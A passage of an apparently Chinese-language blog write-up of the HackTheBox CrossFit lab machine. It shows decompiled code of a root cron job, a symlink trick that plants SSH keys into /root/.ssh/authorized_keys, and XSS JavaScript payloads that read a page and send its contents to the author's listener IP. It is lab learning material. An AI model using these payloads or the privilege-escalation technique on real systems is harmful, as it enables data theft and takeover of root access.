+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x pspy64</span><br><span class="line">./pspy64 -f</span><br></pre></td></tr></table></figure>
+
+<p>发现一个 <code>dbmsg</code> 在定期运行，反编译，发现如下代码逻辑</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">__uid_t</span> _Var1;</span><br><span class="line">  <span class="keyword">time_t</span> tVar2;</span><br><span class="line"></span><br><span class="line">  _Var1 = geteuid();</span><br><span class="line">  <span class="keyword">if</span> (_Var1 != <span class="number">0</span>) &#123;</span><br><span class="line">    fwrite(<span class="string">&quot;This program must be run as root.\n&quot;</span>,<span class="number">1</span>,<span class="number">0x22</span>,<span class="built_in">stderr</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  tVar2 = time((<span class="keyword">time_t</span> *)<span class="number">0x0</span>);</span><br><span class="line">  srand((uint)tVar2);</span><br><span class="line">  process_data();</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先发现一个伪随机，然后数据库读操作，且数据库读取 <code>message</code> 表里的内容，然后把前三个字段写入 <code>/var/local/md(时间戳)</code> 路径</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process_data</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> iVar1;</span><br><span class="line">  uint uVar2;</span><br><span class="line">  <span class="keyword">long</span> lVar3;</span><br><span class="line">  undefined8 uVar4;</span><br><span class="line">  <span class="keyword">size_t</span> sVar5;</span><br><span class="line">  undefined local_f8 [<span class="number">48</span>];</span><br><span class="line">  <span class="keyword">char</span> local_c8 [<span class="number">48</span>];</span><br><span class="line">  <span class="keyword">char</span> local_98 [<span class="number">48</span>];</span><br><span class="line">  undefined local_68 [<span class="number">28</span>];</span><br><span class="line">  undefined4 local_4c;</span><br><span class="line">  <span class="keyword">long</span> local_48;</span><br><span class="line">  FILE *local_40;</span><br><span class="line">  <span class="keyword">long</span> *local_38;</span><br><span class="line">  <span class="keyword">long</span> local_30;</span><br><span class="line">  <span class="keyword">long</span> local_28;</span><br><span class="line">  <span class="keyword">long</span> local_20;</span><br><span class="line"></span><br><span class="line">  local_20 = mysql_init(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (local_20 == <span class="number">0</span>) &#123;</span><br><span class="line">    fwrite(<span class="string">&quot;mysql_init() failed\n&quot;</span>,<span class="number">1</span>,<span class="number">0x14</span>,<span class="built_in">stderr</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  lVar3 = mysql_real_connect(local_20,<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;crossfit&quot;</span>,<span class="string">&quot;oeLoo~y2baeni&quot;</span>,<span class="string">&quot;crossfit&quot;</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (lVar3 == <span class="number">0</span>) &#123;</span><br><span class="line">    exit_with_error(local_20);</span><br><span class="line">  &#125;</span><br><span class="line">  iVar1 = mysql_query(local_20,<span class="string">&quot;SELECT * FROM messages&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">    exit_with_error(local_20);</span><br><span class="line">  &#125;</span><br><span class="line">  local_28 = mysql_store_result(local_20);</span><br><span class="line">  <span class="keyword">if</span> (local_28 == <span class="number">0</span>) &#123;</span><br><span class="line">    exit_with_error(local_20);</span><br><span class="line">  &#125;</span><br><span class="line">  local_30 = zip_open(<span class="string">&quot;/var/backups/mariadb/comments.zip&quot;</span>,<span class="number">1</span>,&amp;local_4c);</span><br><span class="line">  <span class="keyword">if</span> (local_30 != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span> (local_38 = (<span class="keyword">long</span> *)mysql_fetch_row(local_28), local_38 != (<span class="keyword">long</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((((*local_38 != <span class="number">0</span>) &amp;&amp; (local_38[<span class="number">1</span>] != <span class="number">0</span>)) &amp;&amp; (local_38[<span class="number">2</span>] != <span class="number">0</span>)) &amp;&amp; (local_38[<span class="number">3</span>] != <span class="number">0</span>)) &#123;</span><br><span class="line">        lVar3 = *local_38;</span><br><span class="line">        uVar2 = rand();</span><br><span class="line">        <span class="built_in">snprintf</span>(local_c8,<span class="number">0x30</span>,<span class="string">&quot;%d%s&quot;</span>,(ulong)uVar2,lVar3);</span><br><span class="line">        sVar5 = <span class="built_in">strlen</span>(local_c8);</span><br><span class="line">        md5sum(local_c8,sVar5 &amp; <span class="number">0xffffffff</span>,local_f8);</span><br><span class="line">        <span class="built_in">snprintf</span>(local_98,<span class="number">0x30</span>,<span class="string">&quot;%s%s&quot;</span>,<span class="string">&quot;/var/local/&quot;</span>,local_f8);</span><br><span class="line">        local_40 = fopen(local_98,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (local_40 != (FILE *)<span class="number">0x0</span>) &#123;</span><br><span class="line">          <span class="built_in">fputs</span>((<span class="keyword">char</span> *)local_38[<span class="number">1</span>],local_40);</span><br><span class="line">          fputc(<span class="number">0x20</span>,local_40);</span><br><span class="line">          <span class="built_in">fputs</span>((<span class="keyword">char</span> *)local_38[<span class="number">3</span>],local_40);</span><br><span class="line">          fputc(<span class="number">0x20</span>,local_40);</span><br><span class="line">          <span class="built_in">fputs</span>((<span class="keyword">char</span> *)local_38[<span class="number">2</span>],local_40);</span><br><span class="line">          fclose(local_40);</span><br><span class="line">          <span class="keyword">if</span> (local_30 != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Adding file %s\n&quot;</span>,local_98);</span><br><span class="line">            local_48 = zip_source_file(local_30,local_98,<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (local_48 == <span class="number">0</span>) &#123;</span><br><span class="line">              uVar4 = zip_strerror(local_30);</span><br><span class="line">              <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;%s\n&quot;</span>,uVar4);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">              lVar3 = zip_file_add(local_30,local_f8,local_48);</span><br><span class="line">              <span class="keyword">if</span> (lVar3 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                zip_source_free(local_48);</span><br><span class="line">                uVar4 = zip_strerror(local_30);</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;%s\n&quot;</span>,uVar4);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span> &#123;</span><br><span class="line">                uVar4 = zip_strerror(local_30);</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;%s\n&quot;</span>,uVar4);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    mysql_free_result(local_28);</span><br><span class="line">    delete_rows(local_20);</span><br><span class="line">    mysql_close(local_20);</span><br><span class="line">    <span class="keyword">if</span> (local_30 != <span class="number">0</span>) &#123;</span><br><span class="line">      zip_close(local_30);</span><br><span class="line">    &#125;</span><br><span class="line">    delete_files();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  zip_error_init_with_code(local_68,local_4c);</span><br><span class="line">  uVar4 = zip_error_strerror(local_68);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;%s\n&quot;</span>,uVar4);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为随机数为伪随机，用的标准库函数，我们如果也用C，在目标机器上执行，跟着一起执行，在相同时间生成的就是一样的。</p>
+<p>这里写入的文件内容刚好为3个字段，我们可控，因  <code>dbmsg</code>  是root运行，我们可以写ssh认证公钥进去。因软连接是没有权限限制，只要我们执行了，他就会链接，那么我们可控的内容就可以写入免认证文件里了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /root/.ssh/authorized_keys /var/local/$(echo -n $(./exploit)1 | md5sum | cut -d &quot; &quot; -f 1)</span><br></pre></td></tr></table></figure>
+
+<h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><h3 id="1、HTTP服务可以看到管理员来获取payload2-js，但nc就是接收不到数据，一接收立刻断开"><a href="#1、HTTP服务可以看到管理员来获取payload2-js，但nc就是接收不到数据，一接收立刻断开" class="headerlink" title="1、HTTP服务可以看到管理员来获取payload2.js，但nc就是接收不到数据，一接收立刻断开"></a>1、HTTP服务可以看到管理员来获取payload2.js，但nc就是接收不到数据，一接收立刻断开</h3><p>构造以下payload请求链接 <a target="_blank" rel="noopener" href="http://ftp.crossfit.htb/accounts/create%EF%BC%8C%E4%BF%9D%E5%AD%98%E4%BB%A5%E4%B8%8Bpayload%E4%B8%BApayload2.js%EF%BC%88%E4%B8%8B%E9%9D%A2">http://ftp.crossfit.htb/accounts/create，保存以下payload为payload2.js（下面</a> IP 变为 10.10.14.4 是因为openvpn断了，所以我本机IP变了）</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">this</span>.readyState === <span class="number">4</span> &amp;&amp; <span class="built_in">this</span>.status === <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> xhr2 = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        xhr2.open(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://10.10.14.4:2233/&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        xhr2.send(<span class="built_in">this</span>.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://ftp.crossfit.htb/accounts/create&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>
+
+<p>像之前一样请求，不知为啥，这里卡了好久，服务端可以来我这获取 js代码，但是，nc就是接收不了，或者说是，nc接收到立刻退出，啥都没显示</p>
+<p><img src="/img/htb-crossfit/image-20210814114833762.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210814114833762.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210814114833762"></p>
+<p>然后通过 tcpdump 抓包，发现能正常显示….</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i utun2 host 10.10.14.4 and port 2233 -X</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/htb-crossfit/image-20210814114929839.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210814114929839.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210814114929839"></p>
+<p>麻了….</p>
+<p>会不会是特殊字符影响了 nc 呢？payload2.js 改改</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">this</span>.readyState === <span class="number">4</span> &amp;&amp; <span class="built_in">this</span>.status === <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> xhr2 = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        xhr2.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://10.10.14.4:2233/&quot;</span> + btoa(<span class="built_in">this</span>.responseText), <span class="literal">true</span>);</span><br><span class="line">        xhr2.send();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://ftp.crossfit.htb/accounts/create&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>
+
+<p>啊这… 不应该呀，那前面的 POST 怎么收到的？（虽然前面也会偶尔退出，但还是能收到的）</p>
+<p><img src="/img/htb-crossfit/image-20210814115200480.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210814115200480.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210814115200480"></p>
+<p>等等GET和POST… 难不成当POST请求体过大时，HTTP协议会变成分块传输？ 然后 <code>nc</code> 识别分块有误，所以就退出了？</p>
+<p>尝试了一下持续监听，除非用^C或 ^D强制退出</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvk 0.0.0.0 2233</span><br></pre></td></tr></table></figure>
+
+<p>无果，还是没回显，有大佬知道解决方式的麻烦告知一下~</p>
+<h3 id="2、xhr同会话问题"><a href="#2、xhr同会话问题" class="headerlink" title="2、xhr同会话问题"></a>2、xhr同会话问题</h3><p>设置 <code>withCredentials = true</code> 可以保证两个xhr请求他们在同一会话中，不是很清楚为啥…</p>
+<p>根据浏览器的保护规则，跨域的时候我们创建的sessionId是不会被浏览器保存下来，也就是说，每一次的请求，服务器就会以为是一个新的人，而不是同一个人，当我们指定 <code>withCredentials = true</code> ，服务端会判断请求源是否在已配置的白名单中，如有，则返回 <code>Access-Control-Allow-Origin</code> ，浏览器看到服务端返回的源在可信范围内，则会保存sessionId，所以就保证了多个xhr请求在同一会话中。</p>
+<h3 id="3、PHP指定形数，传入的不是指定的形参"><a href="#3、PHP指定形数，传入的不是指定的形参" class="headerlink" title="3、PHP指定形数，传入的不是指定的形参"></a>3、PHP指定形数，传入的不是指定的形参</h3><p>Command.php 代码：<a target="_blank" rel="noopener" href="https://github.com/mikehaertl/php-shellcommand/releases/tag/1.6.0">https://github.com/mikehaertl/php-shellcommand/releases/tag/1.6.0</a></p>
+<p>看了半天看不出来，传入一个 <code>$key</code> 和 <code>$escape</code> 应该有转义才对，把库拉下来，本机 debug 一下就破案了…</p>
+<p>指定了<code>$escape=true</code> 这个参数，，但是传入的实际还是 <code>$value</code> ? 这么迷的，也就是说就算 <code>$escape=true</code>  ，<code>$escape</code> 还是没有被传入… 然后 <code>$value</code> 传入了，导致 <code>$key</code> 没有被转移</p>
+<p><img src="/img/htb-crossfit/image-20210828154704568.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210828154704568.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210828154704568"></p>
+<p>PHP5.6 和 PHP7.3都试过了，一样….</p>
+<h3 id="4、好像没设置httponly-但为啥抓不到cookie"><a href="#4、好像没设置httponly-但为啥抓不到cookie" class="headerlink" title="4、好像没设置httponly 但为啥抓不到cookie"></a>4、好像没设置httponly 但为啥抓不到cookie</h3><p>GetShell后发现，本来就没有Cookie，只是管理员直接通过 127.0.0.1 去访问，我们外部没法直接访问</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>好像环境经常有毛病？比如lftp不知为啥连不上，有时候数据接收不会来，，之类的 的</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] <a target="_blank" rel="noopener" href="https://www.sqlsec.com/2017/07/nmap.html">https://www.sqlsec.com/2017/07/nmap.html</a></p>
+<p>[2] <a target="_blank" rel="noopener" href="https://baike.baidu.com/item/SYN%E6%89%AB%E6%8F%8F/17658294">https://baike.baidu.com/item/SYN%E6%89%AB%E6%8F%8F/17658294</a></p>
+<p>[3] <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies">https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies</a></p>
+<p>[4] <a target="_blank" rel="noopener" href="https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2019UNCTF">https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2019UNCTF</a></p>
+<p>[5] <a target="_blank" rel="noopener" href="https://wfuzz.readthedocs.io/en/latest/user/advanced.html#filter-language">https://wfuzz.readthedocs.io/en/latest/user/advanced.html#filter-language</a></p>
+<p>[6] <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/open">https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/open</a></p>
+<p>[7] <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Crypt_(C)">https://en.wikipedia.org/wiki/Crypt_(C)</a></p>
+<p>[8] <a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php?id=rule_based_attack">https://hashcat.net/wiki/doku.php?id=rule_based_attack</a></p>
+<p>[9] <a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-PHP-MIKEHAERTLPHPSHELLCOMMAND-538426">https://snyk.io/vuln/SNYK-PHP-MIKEHAERTLPHPSHELLCOMMAND-538426</a></p>
+<p>[10] <a target="_blank" rel="noopener" href="https://security.appspot.com/vsftpd/vsftpd_conf.html">https://security.appspot.com/vsftpd/vsftpd_conf.html</a></p>
+<p>[11] <a target="_blank" rel="noopener" href="https://linux.die.net/man/8/pam_shells">https://linux.die.net/man/8/pam_shells</a></p>
+<p>[12] <a target="_blank" rel="noopener" href="https://www.hackthebox.eu/home/machines/writeup/277">https://www.hackthebox.eu/home/machines/writeup/277</a></p>
+<p><a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2021/03/20/htb-crossfit.html">https://0xdf.gitlab.io/2021/03/20/htb-crossfit.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://0xdedinfosec.github.io/posts/htb-crossfit/">https://0xdedinfosec.github.io/posts/htb-crossfit/</a></p>
+
+  
+  
+    
+    <div class='footer'>
+      
+      
+      
+        <div class='copyright'>
+          <blockquote>
+            
+              
+                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+              
+            
+              
+                <p>本文永久链接是：<a href=https://tari.moe/p/2021/htb-crossfit/>https://tari.moe/p/2021/htb-crossfit/</a></p>
+              
+            
+          </blockquote>
+        </div>
+      
+      
+    </div>
+  
+  
+    
+
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/HTB/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>HTB</p></a></div>
+
+
+        
+      
+    </div>
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+        <a class='prev' href='/p/2021/2021ycb/'>
+          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>2021羊城杯部分 Writeup</p>
+          <p class='content'>
+
+
+
+和几个**”社会”**人士（@DEADF1SH-CAT、 @Oah、 @小火车）一起组队参加了这次比赛，终于不用在高校组卷了，哈哈
+部分题目下载链接：
+
+2021ycb-misc.7z
+...</p>
+        </a>
+      
+      
+        <a class='next' href='/p/2021/ai-in-cybersec/'>
+          <p class='title'>人工智能在网络安全领域的技术和应用<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>前言事情起因：老师让我帮忙找一些人工智能在网络安全领域涉及到的技术和应用，刚好来个我接触过的小总结~
+然后在前沿网络安全领域的应用（3-5），主要是一个在读研同学提供的，他们的实验室主要是搞AI...</p>
+        </a>
+      
+    </div>
+  
+</article>
+
+
+  
+
+  <article class="post white-box reveal shadow" id="comments">
+    <p ct><i class='fas fa-comments'></i> 评论</p>
+    
+    <div id="gitalk-container"></div>
+
+  </article>
+
+
+
+
+
+
+</div>
+<aside class='l_side'>
+  
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>文档目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-text">弱口令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sftp%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F"><span class="toc-text">sftp敏感信息泄漏</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E4%B8%80%E6%AD%A5%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-text">进一步信息搜集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">Web漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81-XSS"><span class="toc-text">验证 XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95-XSS-XHR"><span class="toc-text">尝试 XSS+XHR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8C%E6%BA%90%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">同源信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-gt-CSRF"><span class="toc-text">XSS -&gt; CSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E5%90%88-xss-bypass-anti-csrf-token-%E8%BF%9B%E8%A1%8C-CSRF"><span class="toc-text">结合 xss bypass anti-csrf-token  进行 CSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GetShell"><span class="toc-text">GetShell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5%E6%80%BB%E7%BB%93"><span class="toc-text">阶段总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-text">后渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E8%8E%B7%E5%8F%96%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="toc-text">权限提升 - 获取普通用户权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E8%8E%B7%E5%8F%96%E5%90%8C%E7%BB%84%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90-%EF%BC%88%E5%8F%AF%E9%80%89%EF%BC%89"><span class="toc-text">权限提升 - 获取同组用户权限 （可选）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%A9%E7%94%A8"><span class="toc-text">命令执行利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E9%AB%98%E6%9D%83%E9%99%90FTP%E7%94%A8%E6%88%B7"><span class="toc-text">寻找高权限FTP用户</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E8%8E%B7%E5%8F%96root%E6%9D%83%E9%99%90"><span class="toc-text">权限提升 - 获取root权限</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98"><span 